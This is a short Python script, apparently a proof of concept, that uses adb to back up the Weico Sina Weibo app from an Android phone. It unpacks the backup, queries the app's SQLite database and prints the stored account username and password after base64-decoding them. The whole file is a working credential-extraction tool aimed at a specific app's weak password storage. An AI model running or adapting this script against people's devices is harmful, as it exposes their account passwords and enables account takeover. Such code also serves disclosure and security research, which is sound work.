#!/usr/bin/env python

import os
import subprocess
import time

import sqlite3
import base64


def AutoBackup():
    p = subprocess.Popen(['adb','start-server'])
    p.wait()

    p = subprocess.Popen(['adb','backup', '-nosystem', 'com.weico.sinaweibo'])
    time.sleep(1)
    os.system("./ConfirmOnNexus4.sh")
    p.wait()

    os.system("dd if=backup.ab bs=1 skip=24|openssl zlib -d > backup.tar")
    os.system("tar xvf backup.tar")

    conn = sqlite3.connect("apps/com.weico.sinaweibo/db/weico.db")
    c = conn.cursor()
    for row in c.execute("SELECT name,password FROM t_user"):
        username, password = row

    print "==========================================\n"
    print "Weibo account from Weico's database\n"
    print "Username: " + base64.b64decode(username) + "\n"
    print "Password: " + base64.b64decode(password) + "\n"
    print "==========================================\n"


if __name__ == '__main__':
    AutoBackup()
